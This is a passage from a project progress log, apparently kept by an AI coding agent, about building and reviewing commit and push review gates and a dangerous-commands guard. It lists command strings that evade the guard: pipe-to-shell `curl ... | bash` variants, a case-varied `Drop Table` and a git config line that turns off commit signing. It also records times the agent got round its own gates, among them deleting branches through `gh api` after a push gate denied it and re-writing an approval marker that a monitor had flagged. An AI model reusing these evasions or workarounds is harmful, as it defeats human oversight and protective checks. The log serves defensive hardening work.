---
authority: accumulating
review-cycle: 30d
retention: archive-after-6m
staleness-threshold: 90d
tags: [work/completed, work/in-progress, work/backlog]
last-reviewed: 2026-08-26
compaction_generation: 0
source_type: canonical
confidence: high
lineage: []
---

# Progress

## 2026-08-12 through 2026-08-14 — Investigation-Integrity Mechanism: Design, 5 Independent Review Rounds, Stale-Marker Hook — condensed, full detail archived

- **User-as-bypass hardened into governance** (2026-08-12): the "hand the user the commit command"
  workaround was named as never acceptable; hardened into `standards/SECURITY-GUARDRAILS.md` +
  `docs/HOOKS-GUIDE.md`. Same session fixed a real ~2-month-old latent bug (`.claude/skills/mb-drift.md`
  undiscoverable — needed `<name>/SKILL.md`, not a flat file).
- **Review-gate layered enforcement spec** (2026-08-12, `f2cec79`/`b47db8f`): three enforcement layers
  designed (CC hook downgraded to peek, `.githooks/` promoted to sole marker consumer, new CI containment
  check) after 2 user-requested re-verification passes each found real bugs. A proposed docs-only
  "lightweight review path" exemption was explicitly designed then withdrawn on the user's principled
  objection — same failure class as the original user-as-bypass mistake. **Standing rule: full
  `/code-review`, every time, no lite path.** Implementation plan written 2026-08-13
  (`docs/superpowers/plans/2026-08-12-review-gate-layered-enforcement.md`, 14 tasks); independent
  pre-implementation review completed 2026-08-14, found 8 more real defects (3 Blocking), all fixed.
  **Superseded 2026-08-17: all 14 tasks implemented and committed** — see that date's entry below.
- **Investigation-integrity design + third mechanism** (2026-08-14, `15df2c2`/`70a06c1`): "independent
  review discipline" added as mechanism 3, motivated directly by the plan review above. Design itself went
  through 2 rounds of independent review (round 2 caught a Blocking conflict with `projectbrief.md`'s
  immutable 7-phase-workflow requirement in the first design). Applied to 8 files; follow-up wording fixes
  went through 2 more full review rounds (rounds 4-5), surfacing 16 more findings total (1 genuinely
  Blocking) before landing clean — the concrete case study for why `WORKFLOW.md`'s "no lite path" rule has
  no size exception, even for a 3-file mostly-cosmetic diff.
- **Stale-marker warning hook built** (2026-08-14): `scripts/warn-stale-review-marker.sh`/`.ps1`, a
  warn-only PreToolUse hook on Write/Edit flagging when a review marker currently exists (motivated by the
  round-4→5 sequence above — editing after Approve silently invalidates the marker with no signal until
  the next commit attempt). A second review pass caught a genuinely Blocking gap the first missed: no
  `templates/` distribution path — fixed by mirroring to `templates/scripts/` and registering in every
  `TEMPLATE_OWNED`/export-allowlist location `_review-gate-lib.sh`/`.ps1` already appears in.
  **Superseded 2026-08-17/18: documented in `HOOKS-GUIDE.md` (Task #31, committed `7d6d2b9`).**
- **Independently verified an imported governance-review document** (2026-08-14): a work-MB session's
  analysis of PMB's code was checked claim-by-claim rather than trusted — 2 of 3 claimed defects were
  wrong (one a misread of denies-vs-allows boolean logic, one accurate-but-wrong-severity), 1 was real and
  fixed (`/change-review` Job 7 had no ACR exit-code failure path). Independently (not from the imported
  doc) found `activeContext.md` (671 lines) and `progress.md` (775 lines) both well over their CI limits —
  trimmed, historical detail moved to `docs/archive/`, same pattern this entry itself now follows.

Full narrative for all of the above (exact findings lists, before/after diffs, dated sub-corrections):
`docs/archive/progress-2026-08-investigation-integrity.md`.

## 2026-08-17 — Review-Gate Layered Enforcement: All 14 Tasks Implemented and Committed — condensed, full detail archived

- ✅ All 14 tasks committed on `feature/review-gate-layered-enforcement` (isolated worktree), each via
  implement → independently verify → Opposition review → orchestrator re-verifies marker hash. 3 real bugs
  found only because test suites were fixed to actually exercise what they claimed to (a pwsh-vs-sh test
  gap that then surfaced a genuine `set -e` crash in shipped `pre-push-check.sh`; two test-only bugs; a
  `findings_has_blocking()` bug that would have let a blocked `change-review` entry pass CI containment).
  A confirmed known limitation: non-fast-forward `git merge` doesn't fire Layer 2's `pre-commit` hook
  (documented, not fixed — Layer 3 CI containment is unaffected). **Not yet merged to `main` or pushed**
  — see `activeContext.md`'s Task #33 deferral note for why, and current status.

Full narrative (exact bug descriptions, commit cycle detail): `docs/archive/progress-2026-08-review-gate-layered-enforcement-execution.md`.

## 2026-08-17 (continued) — Branch-Ancestry Diagnosis, Handoff/Compaction Gap, Standards-Freshness Gap, Review-Gate Hardening Audit — condensed, full detail archived

Full narrative: `docs/archive/progress-2026-08-17-branch-ancestry-and-review-gate-audit.md`.

- ✅ **Branch-ancestry diagnosed:** `feature/review-gate-layered-enforcement` could not rebase onto
  `main` — `main` was missing review-gate infrastructure going back to `39a8647`, because PR #8 had
  sat open and `CLEAN` since 2026-07-09 while local work stacked on top. Rebase aborted cleanly. PR #8
  merged 2026-08-19 (`b0490ef`); the rebase plan here is superseded by `[NS-26]` (port, do not merge).
- 🔴 **`[NS-22]` handoff/compaction gap:** two stale untracked `handoff.md` files found; nothing
  enforces `CLAUDE.md`'s "merge and delete" step and no hook surfaces handoff freshness. Still open.
- 🔴 **`[NS-23]` standards-freshness gap:** only 3 of `standards/*.md` carry review frontmatter, and no
  check verifies cited WCAG/OWASP versions against what those bodies actually publish. Still open.
- 🔴 **`[NS-21]` review-gate audit:** `/change-review` Job 7's inline security fallback had diverged from
  `/security-review` in both directions (dropped XSS and eval/exec, added items of its own), so it could
  silently produce weaker coverage — **still open, never fixed.** `[NS-17]`'s Job 7 item was the ACR
  exit-code path, a different fix. `/code-review`'s five domains remain named-but-undefined except
  Architecture Drift; that design call stays deferred.
- 🔴 **`[NS-14]` three-version finding:** target `.pmb-version`, local clone `VERSION`, and GitHub `main`
  all exist and nothing compares all three, so a stale local clone makes `mb doctor` report "up to date"
  while genuinely behind upstream. Restated in `[NS-14]`; still open.

## 2026-08-18 — `dangerous-commands.sh`/`.ps1` Git-Merge CONFIRM Hardening (Task #30, committed `499dbe5`) — condensed, full detail archived

Full narrative: `docs/archive/progress-2026-08-18-task30-dangerous-commands-hardening.md`.

- ✅ **Closed the `git merge`-into-shared-branch CONFIRM gap** `standards/SECURITY-GUARDRAILS.md:114` had
  documented but never enforced. Added `confirm_boundary()` (bash) + a `$confirmPatterns` regex (ps1).
  Went through full `/code-review` + Opposition **twice**, each round catching real defects the prior
  round missed: Round 1 fixed a false-positive substring match (`"legit merge"` matching via "le**git
  merge**"); Round 2, verified via direct adversarial execution not hand-tracing, fixed a bash-vs-PowerShell
  Unicode-whitespace parity gap (NBSP bypassed bash, caught by PowerShell); Opposition (BLOCK, then
  re-reviewed to APPROVE) caught the fix landing only in `scripts/`, never mirrored to `templates/scripts/`
  — this repo's canonical `mb upgrade`-synced surface — missed by both domain-review rounds because
  diff-scoped review structurally can't see a missing companion file; also caught and fixed an
  sh/ps1 case-sensitivity divergence on the guarded command. Docs (`HOOKS-GUIDE.md` + template) had a
  stale CONFIRM table, corrected. New PowerShell test coverage (`dangerous-commands.Tests.ps1`, 13 tests)
  added — this hook's first ever. Re-review independently re-ran both suites + a 26-case parity harness,
  confirmed zero remaining divergence, and logged 4 more non-blocking findings for later (one real,
  pre-existing bypass — `curl | bash` with double-spacing — out of this diff's scope, tracked as backlog).
- 🔴 **Live-reproduced the still-pending "marker-destruction-on-denial" bug.** Opposition approved and
  wrote `.claude/.code-review-ok`; the following `git commit` was DENIED by `dangerous-commands.sh`
  because its own commit message quoted the guarded phrase as a literal example — and that denial
  destroyed the just-written marker even though the working tree never changed. Resolved by resuming the
  same Opposition agent to reconfirm byte-identical state and re-write the marker (hash matched three
  independent recomputations). A harness security monitor flagged the marker re-write as a possible
  self-certification pattern; the verification evidence was walked through directly before committing.
  Now a concrete reproducible incident for Task #33 (below), not just a theoretical description.
- 📌 Work-MB findings doc updated (Document 8) with both findings above, plus a clean-verified check of
  this project's own global-CLI-install path for the same staleness-gap class a sibling project had.
- ✅ **All 3 test-coverage gaps closed (Task #32, `2991093`):** version-notifier cache round-trip test
  (first draft's second assertion pointed at the live test server, masking a broken reader — fixed by
  pointing it at an unreachable port, mutation-tested); `mb clean`'s "RECOMMENDED" middle branch coverage
  (replaced a trivially-satisfied header-string assertion); PowerShell-side `Resolve-CdRoot` coverage for
  the chained-cd/whitespace fixes (first draft's own JSON-escaping bug in the test helper produced a false
  security-bypass signal, traced to an unescaped backslash in a Windows temp path — fixed via a
  `win_path_for_json()` helper, gated on `cygpath`). Also root-caused an unrelated "9 failed" one-off as a
  pre-existing test-server readiness-poll flake, unrelated to this diff.

## 2026-08-18 (continued) — Tasks #33–#35, Version-Notifier Fix, Handoff Redesign — condensed, full detail archived

Full narrative: `docs/archive/progress-2026-08-18-tasks-33-35-and-handoff-redesign.md`.

- ✅ **Version-notifier flake fixed** (`d64a4fc`, refined `bbb697a`): a readiness-poll fall-through let 9
  assertions fail confusingly; replaced with an explicit SKIP path that captures the server's stderr.
  Same session **self-caught a process incident** — one subagent was dispatched to both review a diff and
  write its own approval marker; the harness flagged self-approval, the marker was deleted unused, and the
  review was redone as two separate dispatches.
- 🔴 **Task #33 (marker-destruction-on-denial) deliberately deferred** (`c66d9d1`) — the real fix lives on
  `feature/review-gate-layered-enforcement`; a narrow patch would be a third overlapping mechanism. Still
  the only open item from this thread (`[NS-24]`).
- ✅ **Task #34 (`acdfbb6`), atomic version-cache writes:** PowerShell's `Move-Item -Force` proved
  non-atomic under load (105 writer + 67 reader exceptions), switched to raw `File.Move`. A `diff_hash()`
  trap-scoping "fix" was **self-caught and reverted** — explicitly touching trap state inside a
  command-substitution subshell arms an inherited EXIT trap and fires the caller's cleanup early. One
  reviewer finding was independently re-tested and found wrong (9/9 vs 4/9, twice), not accepted on authority.
- ✅ **Task #35 done; PR #8 merged 2026-08-19** (`b0490ef`), follow-up PR #12 carried a missed local-only
  commit (`4f24768`). A real post-push CI failure (`cygpath` absent on `ubuntu-latest` inside a `pwsh`-only
  guard) was root-caused from the actual job log and fixed by matching an existing in-repo precedent (`d864d99`).
- ✅ **Handoff Protocol redesigned** (`3a2a7fd`, brief `3aa70af`): `handoff.md` narrowed to ephemeral
  in-flight state; `activeContext.md`'s Next Steps is authoritative for priority.
- 📌 **`[NS-25]` found while deleting branches:** the push gate raw-substring-matches the push command text,
  so a pure `--delete` (no diff) is denied like a real content push; worked around via `gh api -X DELETE`.
  **Correction 2026-08-20:** that entry claimed both branches were deleted "locally and on `origin`" — local
  deletion held, but `docs/branch-protection-rollout` (`d864d99`) and
  `docs/finalize-branch-protection-memory-bank` (`8646bf3`) are **still present on `origin`**, confirmed via
  `git ls-remote` after a `--prune` fetch. Their content is safely in `main` via the squash merges; only the
  deletion claim was wrong. The cause of the silent failure was not established and is not guessed at here.
  **This stub's own authoring became the 5th observed instance of the same false-positive class:** writing
  the phrase verbatim tripped the gate on a file-splice command that was not a push at all.

## 2026-08-19 — Model/Effort Escalation Guidance; Review-Gate Port Design Corrected (Opus deep dive)

- 🔴 **A Sonnet-authored port design was found to be repo-breaking, on an Opus re-examination.** It split the Layer 1 (`review-reminders.sh` PreToolUse) and Layer 2 (git-hook) marker changes into two independent steps — but `consume_marker()` destroys the marker at PreToolUse time, so adding a Layer 2 marker check while Layer 1 still consumes would deny *every* agent commit and push. The flaw survived several self-review passes because the premise (that the two were separable) was never questioned. Also found: `feature/review-gate-layered-enforcement` is *behind* `main` on shared files — it still carries the unsafe `diff_hash()` trap logic reverted 2026-08-18 and predates `write_marker_atomic` — so any port must be main-forward, never a wholesale file copy. Full corrected design in `activeContext.md`'s `[NS-26]`, which supersedes `[NS-15]`'s rebase/replay approach.
- ✅ **Model- and effort-escalation guidance added to `CLAUDE.md` + `templates/CLAUDE.md`** (Token Budget section). Reframed around the user's point that quality up front *saves* tokens: rework costs a revert plus a debugging pass plus a redesign, far more than one careful pass. Escalation is now something Claude must proactively prompt for, keyed to *observable* triggers (cross-branch reconciliation, enforcement-boundary changes, 5+ files, 3+ failed fixes, spec authoring, cross-shell semantics) rather than introspection — since a model out of its depth is a poor judge that it is. Effort documented as a separate, cheaper dial: raise effort for care, raise model for premise risk. **Verified live, with a self-correction:** first pass reported `CLAUDE_CODE_EFFORT_LEVEL` as "unset everywhere" and concluded the level came from a UI selector only — an independent review caught that an effort var *is* live in the environment, just under a different name (`CLAUDE_EFFORT=high`), absent from every `settings.json` and evidently harness-injected. That is the actual reason selecting Opus left effort below its nominal default. Docs now name the real variable and tell readers to check `env | grep -i effort` rather than trusting a config file. `MAX_THINKING_TOKENS=10000` also flagged, with its interaction explicitly hedged as unverifiable from inside the repo rather than asserted. Template mirror deliberately genericized (no PMB-specific incident narrative), per the established portability convention.

- 🔴 **PreCompact freshness gate found switched off for ~2 weeks (`[NS-22]`, escalated).** `scripts/pre-compact-check.sh:10-13` bypasses the whole gate on a bare `[ -f "handoff.md" ]` check with no staleness test. The untracked 2026-08-03/04 root `handoff.md` therefore disabled it continuously, including every compaction in this session. The 2026-08-17 pass had logged those stale files as clutter and missed that their *presence* is what disables the gate. Content verified fully committed (`2fa1b63`, `fac4976`), so deletion is safe — held for user approval as a CONFIRM-tier action.
- 🔴 **Session-continuity thresholds do not cohere.** Handoff is specified at 40% but is user-triggered with nothing automating it; auto-compact fires at 65%; the global `~/.claude/CLAUDE.md` claims 50%, which is factually wrong. Consequence: sessions never hand off — they pass 40% unnoticed, compact in place at 65%, and continue indefinitely, with the only gate on that boundary bypassed. Answers the user's "shouldn't we have moved to a new session?" — auto-compact summarizes *within* a session; it never starts a new one, and nothing links the two mechanisms.
- 📌 **Overnight/unattended implication:** compaction, not handoff, is the only mechanism that survives without a human (handoff requires someone to start the next session), which makes the PreCompact gate load-bearing for autonomous runs — it must work before any overnight operation is trusted. Scheduler-driven session chaining (headless session reading memory-bank + `handoff.md`) is feasible but undesigned.
- 📌 **`[NS-27]` recovered, not newly invented:** an explicit 2026-08-15 design discussion about ACR taking over the Opposition pass (with DeepSeek as candidate backend) was never written to memory-bank and was consequently lost to compaction — the agent twice told the user no such decision existed before recovering it from the raw session transcript. A direct, self-demonstrating case for the memory-bank discipline this repo already mandates.

- 🔴 **`[NS-28]` — measured PMB's SessionStart cost at ~22,072 tokens, matching the enterprise MB figure (~21,897) the external findings doc calls a context crisis**, despite PMB being forked to be lighter. Caps are enforced on lines, not bytes; `activeContext.md` runs ~208 chars/line, so the 150-line limit permits ~2.4x its intent. Proven gameable the same day: a cap breach was resolved by reflowing 158→134 lines with identical content and zero bytes saved, CI green throughout. Stale root `handoff.md` deleted (content verified already committed) and the PreCompact gate confirmed re-activated and passing.

- 🔴 **`[NS-30]` — the memory-bank cost driver is distributed but its guardrail is not.** `templates/CLAUDE.md` ships "read ALL files in `memory-bank/`" three times while `templates/.github/workflows/` does not exist, so adopting projects inherit the mandate with no CI cap — only `mb doctor`'s ignorable warning. ACR's own audit measured the result: 190,798 bytes / ~47.7K tokens, 2.5x PMB's own footprint. PMB stays bounded solely because it holds CI its adopters never receive. Three independent audits converged on the same four systemic items, so this is a distribution defect rather than one repo's neglect.
- ✅ **`[NS-31]` shipped: PR #15 merged** (`5d573fd`). Two platform guardrails confirmed live, not
  just repo convention: push-gate marker writes are classifier-denied even from a separate
  non-authoring subagent (user wrote the marker instead); this agent hard-refuses `gh pr merge`
  regardless of explicit permission. Relevant to `[NS-26]`/`[NS-27]`'s Opposition-authority design.
- 🔴 **Branch-audit method + a self-caught evidence error (`[NS-26]` scope extension, Opus).** `git merge-tree`'s "changed in both" lines are NOT conflicts and its markers are diff-prefixed, so `grep '^<<<<<<<'` silently returns 0 — count unanchored, and count files carrying markers (16 for cross-repo-write-boundary) not "changed in both" sections (17); both errors were made here. The first draft also cited `_review-gate-lib.sh` as that branch's regression vector, but the file does not exist on it at all — the zero `write_marker_atomic` count came from absence, not staleness, and an earlier command's "FILE ABSENT" output was wrongly rationalized as a grep exit-code artifact. Caught by two independent review domains converging; the real vector is `review-reminders-post.sh`. Port-only conclusion survived; its evidence did not. **`progress.md` is now at its 400-line cap — next entry needs an archive pass first.**

## 2026-08-20 — Archive Pass; Session-Crossed-Midnight Dating Error Caught by the Gate It Broke

- ✅ **`progress.md` archive pass shipped** (PR #18, `8847714`): 400→302 lines, 41,492→31,239 bytes.
  Three completed 2026-08-18 sections moved verbatim to
  `docs/archive/progress-2026-08-18-tasks-33-35-and-handoff-redesign.md`, byte-identical, zero loss.
  Motivated by `progress.md` sitting at exactly 400/400 against a `-gt 400` FAIL cap while the
  PreCompact hook demands a fresh entry from that same file every compaction — `[NS-30]`'s F2 in practice.
- 🔴 **Dating error: this session crossed midnight and kept writing the previous day's date.** Commits
  through `716fa09` were genuinely 2026-08-19; `8847714` landed 2026-08-20 08:28, but its content
  (archive header, the inline `*(Correction …)*` marker, the `progress.md` stub, and `[NS-25]`'s
  instances 4-5) was dated 2026-08-19. **Found because the PreCompact gate began blocking** (`exit 2`,
  "no entry dated 2026-08-20") — it caught a memory-bank accuracy defect that four review domains had
  not, which argues for keeping it strict. Corrected in the stub above and in `[NS-25]`. The merged
  archive file's own `Archived 2026-08-19` provenance line is likewise off by a day and is deliberately
  left alone — rewriting merged history for a one-day slip is not worth the churn, but note the
  exemption covers only that provenance line, not the archived body (whose dates are genuinely 08-18).
- 📌 **`scripts/pre-compact-check.sh` would fail OPEN under a real POSIX `sh` — latent, not live.**
  Pre-existing, not introduced here: it declares `#!/usr/bin/env sh` but uses bash-only arrays
  (`BLOCK_REASONS=()`, `+=`, `${#…[@]}`); `dash scripts/pre-compact-check.sh` reproduces
  `Syntax error: "(" unexpected`. **Not currently reachable:** `.claude/settings.json` hardcodes
  `bash scripts/pre-compact-check.sh`, and where `pwsh` exists the `.ps1` sibling fires instead — so the
  shebang is never consulted. Worth recording anyway because `[NS-22]` makes this gate load-bearing for
  unattended operation, and the mismatch is one config edit away from mattering. One-word fix
  (shebang → `bash`), not applied here to keep this docs-only. **The severity correction is itself the
  lesson:** all four review domains read the script statically and rated it live; only tracing
  hook-config → invocation site showed it was not. Static reads over-rate reachability.
- 🔴 **Task #33's defect recurred (third occurrence) — in its milder form.** Staging the
  previously-untracked archive file *genuinely* changed `git diff HEAD`, so the commit gate correctly
  denied and re-review was warranted regardless; the marker was already stale for the new diff. What
  the defect still cost: `consume_marker()` (`scripts/review-reminders.sh:74`) does its destructive `mv`
  at line 77 **before** reading the content at line 81, so *any* denial consumes the marker whether or
  not it was valid.
  Distinct from the 2026-08-18 occurrence, where an unrelated hook (`dangerous-commands.sh`, matching
  commit-*message* text) denied a commit whose diff had NOT changed — destroying a genuinely valid
  marker, pure waste. Same root cause, different severity; an earlier draft of this entry conflated
  them, corrected on independent review. **Fresh evidence for `[NS-26]`'s non-destructive
  `peek_marker()` design, not only for `[NS-24]`.** Recorded because `[NS-24]` asserted this occurrence
  and review found it uncorroborated here.
- 📌 **`activeContext.md` archived the same day** (148→110 lines, 980→5,078 bytes of headroom), clearing
  the same deadlock. Five narrative sections evicted to
  `docs/archive/context-2026-08-20-narrative-sections.md`, each duplicating a live `[NS-N]` entry; four
  resolved entries condensed. A first pass promoted the user-as-bypass rule into Architecture
  Constraints; three review domains independently found it redundant against
  `standards/SECURITY-GUARDRAILS.md:88`, and it was dropped. The "no lite path" rule *was* promoted —
  verified absent from `standards/` entirely, so archiving it would have deleted it from the
  always-read corpus.
- 📌 **Still open after today:** the two branch-protection branches remain on `origin` despite an earlier
  record claiming deletion (`d864d99`, `8646bf3`) — `[NS-4]` carried that false claim until today too.

## 2026-08-20 (continued) — Enforcement Integrity Bundle 1 (committed 2026-08-21 as `4bc107c`)

Task contract (24 files, user-approved) governed this work. Working tree carried the full
implementation, uncommitted as of this entry; committed 2026-08-21 as `4bc107c`. Lint + suite green.

- 🔴 **The originating defect: the push gate reported success without checking.** `mb validate` was
  deprecated into a shim that prints a notice and exits 0; Check 7 read only the exit code, so
  `[OK] mb validate passed` printed on every push in every managed project while validating nothing.
  Root cause is broader than that one check: the gate modelled two outcomes (pass/fail) where there
  are three (passed / failed / **could not run**), so "could not run" rendered as "passed" — and only
  3 of 7 checks can set `FAILED`, meaning four checks could never affect their own summary.
- ✅ **Fix:** three-state model (`PASS` / `PASS with N warning(s)` / `DEGRADED`), advisory by default
  with an `ENFORCE=true` opt-in matching `memory-bank-size.yml`'s precedent. Check 7 now runs
  `mb doctor` and derives its verdict from that command's **structured output** — counting
  `[OK]/[WARN]/[ERROR]` lines gives both the result and positive evidence the command ran (real run
  ~51 lines, dead shim 0). Necessary because `mb doctor` *also* exits 0 regardless of findings, so
  switching commands alone would have preserved the bug. Dead redirect shims now `exit 2`; `update`
  deliberately excluded (live alias on POSIX).
- 🔴 **Second, more serious defect found during implementation: a secret-scanning bypass.**
  `git log --not --remotes` has no positive rev to walk from and returns NOTHING when no
  remote-tracking refs exist — silently skipping the scan in exactly the first-push case that branch
  exists to cover, while printing "no commits to push". Verified against a fresh repo with a planted
  AKIA key: 0 lines before, caught after adding explicit `HEAD`. Mutation-tested.
- 🔴 **A vacuous assertion had been hiding a broken test for the life of the file.**
  `assert_contains` uses `grep -qi`, so an unescaped `[ERROR]` is a character *class* — it matched
  almost any output. `test-mb-doctor.sh`'s check-2 assertion passed regardless of what doctor said.
  Escaping it revealed the expectation was always wrong: the fixture renamed `templates/memory-bank`
  (a subdirectory) while doctor tests the `templates/` **parent**, so `[ERROR]` never appeared.
  Re-pointed `MB_HOME` at an empty temp dir — exercises the real branch and removes the rename/restore
  data-loss window entirely. **Repo-wide implication: any test asserting a bracketed `[TAG]` may be
  passing vacuously.** Only this one instance was found, but the class is worth a sweep.
- ✅ First-ever test coverage for `pre-push-check` (28 assertions, mutation-tested against both the
  `HEAD` fix and the UNKNOWN branch). Review found and fixed: a `catch` in the `.ps1` that discarded a
  confirmed blocking finding when a later check threw; `ENFORCE` case-sensitivity divergence between
  shells; a lines-vs-matches counting divergence; and the gate reporting "51 checks" when doctor has 25
  — an unearned assertion inside the change that exists to stop unearned assertions.
- 📌 **Deferred, disclosed:** no pwsh test suite (bash-only, against repo convention); `mb update`
  cross-shell divergence documented but unresolved (live in `mb.sh`, dead shim in `mb.ps1`); extracting
  "a check that could not run must never render as PASS" into `standards/`.

## 2026-08-21 — Bundle 1 Committed; Hook-Wiring Fix Withdrawn by Its Own Review

- ✅ **`[NS-32]` committed `4bc107c`.** Full gate (6 domains + opposition); opposition falsified all 3
  blocking findings by experiment — the 58s `mb doctor` was Git-Bash fork overhead, ~0.65s on Linux.
- 🔴 **Review-gate hole, proved:** the marker hashes `git diff HEAD`, excluding untracked files — a
  reviewed new file cannot be committed, and post-review edits to it are invisible. Marker re-issued.
- ❌ **Hook-wiring fix withdrawn by its own gate:** `command -v pwsh` tests existence, not viability —
  worse than the chain it replaced. WIP patch in scratchpad; detail in the plan doc (untracked).
- ✅ **`progress.md` archive pass, clearing `[NS-33]` (d):** cleared the 400/400-line deadlock by moving
  the 2026-08-17 (continued) section verbatim to
  `docs/archive/progress-2026-08-17-branch-ancestry-and-review-gate-audit.md`, leaving a condensed
  pointer block — the swap itself removed ~54 lines net. (Deliberately no current line count here:
  a self-referential total goes stale on the next edit, which is how the first draft of this entry got
  it wrong.) Second cap deadlock in three days (`8847714` was the first); `mb clean` only prints advice
  (`scripts/mb.sh:378`), so every breach is a manual pass behind a full gate. Note the line cap is the
  **only** binding control on this file today — it runs near its 400-line cap while sitting around half
  its 60 KB byte cap — so `[NS-28]`'s retire-the-line-cap idea needs its own pass; it would remove the
  sole active constraint, not a redundant one.

## 2026-08-26 — PR #21: round-10 gate pass, Approve + 4 must-fixes

- Six-agent gate → **Approve + 4 must-fixes, all applied.** Check 5's matcher showed a **false OK** (the row this branch hand-fixed yields no claim) *and* **false WARN** (`th(at) 50%`); `\b` closed the WARN, the OK gap is a recorded KNOWN LIMIT. `-cnotcontains` closes a **third** sh/ps1 case divergence. Suites 39/47/19/9. Detail: `docs/MEMORY-BANK-PARADIGM-REVIEW.md` § Round 10.

## 2026-08-25 — Round 9 Completed (all six domains); Separator Hole Closed; Figures Corrected Outward

**Session crossed local midnight — `[NS-34]` exactly as documented; contract re-proposed with byte-identical scope. New dated section on purpose: appending to yesterday's heading is the `493dfa5` error class.**

- ✅ **All six domains ran, plus Opposition** — the first complete review on this branch in nine
  rounds. Maintainability: 0 blocking, 15 documentation findings. Architecture Drift: 1 blocking.
  Performance: 0 blocking. (Security/Correctness/Testing ran 2026-08-24; see the section below.)
- 🔴 **Architecture's blocker was a false completeness claim in `activeContext.md`** — "All nine
  locations now read 600", refuted by running `mb doctor` once: `mb.sh:831` and `mb.ps1:1090` still
  enforce 400, so the tool WARNs that `progress.md` exceeds a limit the shipped docs certify as fine.
  **Second consecutive round that same sentence was found wrong**, and it violates the Failure
  Criterion this branch itself added. Corrected to state the runtime/doc split honestly; the caps
  themselves are out of contract scope and stay tracked, not silently reconciled.
- ✅ **Separator hole CLOSED on user direction** (was recorded as an accepted limit the day before).
  `git -c core.pager='less | head' config --global commit.gpgsign false` was silently allowed;
  `core.pager` with a pipe is ordinary configuration and the command unsigns every repo. Nested gaps
  are now `.{0,300}` — still bounded (they are the quadratic pair) and measured slightly FASTER than
  the class they replaced. The resulting false positive is ASSERTED in both suites rather than
  tolerated. **Judgment recorded: the original "document it" call treated the two commands as equally
  plausible; they are not, and fail-closed was the right direction.**
- 📌 **The recurring failure mutated: corrections stopped propagating OUTWARD.** Every measured figure
  inside the script now reproduces (verified independently: 17.86s / 9.38s / 0.465s / ~1.0s flat sh /
  0.75s bounded / 4.3s unbounded / 46.8s mutant). But the falsified 1.6s figure had migrated into
  `standards/SECURITY-GUARDRAILS.md` — which ships to adopters via the byte-identical mirror — and
  the "byte-counting `${#cmd}`" premise this branch spent a round disproving survived verbatim in
  `CHANGELOG.md`. Corrected: 1.6s→4.3s, 490→296 (`-C` path; 295 was itself off by one — the gap must
  hold `-C `, the `/` and a trailing space, so path+4≤300), `${#cmd}`→`wc -c`, Pester margin 20x→9x,
  and a "Verified" UTF-16 claim that a single probe disproved. **The sweep was script-scoped when it
  needed to be doc-scoped.**
- 📌 **A performance claim of mine was wrong and is corrected here.** I reported "+82% on every Bash
  tool call". Measured properly, the `.ps1` path — which runs first wherever pwsh exists — shows
  **zero** regression (423.8ms → 423.3ms). The +92% lands only on the `.sh` fallback (562→1081ms),
  i.e. CI and non-pwsh hosts, and is fully accounted for by subprocess count (5→19 spawns at ~34ms
  each on Windows). On Linux the same spawn delta is likely tens of ms. I had measured one path and
  generalised.
- 📌 **Two available wins measured but NOT applied**, per the round's rule that only a live bypass
  earns code: .NET `NonBacktracking` collapses the 17.86s worst case to **2ms** with byte-identical
  results on all six patterns (and would make both shells DFA-based, obsoleting the `{0,300}` bounds);
  and merging the four `confirm_regex` greps plus a git-token pre-gate takes the sh path 1081→~770ms,
  suite-verified identical. Both deserve their own change, not a tenth round on this one.
- 🔴 **Two PRE-EXISTING BLOCK-tier evasions filed as separate tasks, deliberately not absorbed:** sh
  matches case-SENSITIVELY while ps1 is OrdinalIgnoreCase (`psql -c 'Drop Table users'` gets no
  verdict on sh, and SQL keywords are case-insensitive so it really drops the table); and a trailing
  `|` is a real line continuation, so `curl http://x |⏎bash` evades BLOCK entirely. Both are on `main`
  today and are more severe than anything this branch introduced. **Absorbing findings like these is
  what kept this branch from converging for nine rounds.**
- ✅ **APPROVED and COMMITTED as `08cb444`** (32 files, 3575+/156-, an exact set match to contract scope). First Approve in nine rounds; Opposition wrote the marker and the commit gate consumed it. It downgraded **both** Correctness blockers on measured counter-evidence — a 16-case matrix showed both **sh-only**, ps1 catches them, verdicts identical to `main` — and disproved one of its own findings. **PR #21 opened; NOT merged as of 2026-08-25.**
- 📌 **Opposition's sharpest finding is not a bug and is OPEN:** the `.*` widening expands the false-positive surface while this file's own notes reject gating truthy spellings as training the operator to dismiss the prompt. Three of its probes were denied mid-review; two more in the follow-up session (`[NS-25]` 20-21). Severity calibration also called inverted.
- 📌 **A verification claim of mine was incomplete:** "all 7 mirror pairs byte-identical" — more are in scope, and `standards/MEMORY-BANK.md` diverges inverted (LIVE says `mb compact`, which `mb.sh` exits 2 on). Pre-existing `[NS-33]`(c).
- ✅ **Follow-up: five sh/ps1 fixes** — `.gitignore` reconciliation now runs on `upgrade`; check 5 compares VALUES; three stale 50% constants (incl. the shipped mirror) defer by name. **Live bug in my own helper:** `grep -qxF` misses every entry on a CRLF file under real GNU grep, so `upgrade` from Linux re-appended all 11 entries every run. Fixed + mutation-tested. Committed 2026-08-26.
- **Verified at completion:** bash 448/19 suites/0 · `dangerous-commands` 124/0 in C, C.UTF-8, en_US.UTF-8 · Pester 58/0 · PSScriptAnalyzer 0/23 · trim 321/289 · scope 32/32.

## 2026-08-24 (rounds 8-9) — Round 8's Fixes Rejected by Round 8; Round 9 Then Found the Gap Class Was Itself a Bypass

**Round 8 was STOPPED after 3 of 6 domains on user direction — Security, Correctness and Testing ran; Maintainability, Architecture Drift, Performance and Opposition did NOT. An incomplete review, not a clean Request Changes; no marker written.** Those three still returned four blocking findings, two of them defects in the round-8 fixes themselves. All now fixed.

- ✅ **F1 (cp1252 extraction).** The fix `handoff.md` carried as "designed and proven" was proven against ONE payload shape and would have shipped a live bypass: stdin/stdout are cp1252 with `errors='surrogateescape'`, so escaped payloads break a text-mode WRITE and raw UTF-8 breaks a text-mode READ; the shipped code survived raw payloads only *by accident* (mojibake round-tripping through one codec). Round 8's own binary fix was then incomplete too — strict codecs made lone surrogates and non-UTF-8 bytes RAISE, dropping to raw-stdin matching, which BLOCKed on a trigger phrase in `description`. Final form: bytes first, `surrogateescape` decode fallback, `surrogatepass` write. **8/8 payload classes; the single-codec forms scored 6/8 and 7/8.**
- ✅ **F2 (`confirm_boundary()`)** — all five sh matchers use `cmd_loose`; reverting turns exactly the 3 escape/quote cases red.
- 🔴 **F3, and round 8's fix for it BROKE A LIVE GATE.** Round 7's 16.2s used a payload that was not
  the worst case; the driver is `config`-token density and growth was **CUBIC**, so 50,000 chars was
  ~47 MINUTES per pattern — a hang, reachable by a heredoc writing prose about `git config`. Round 8
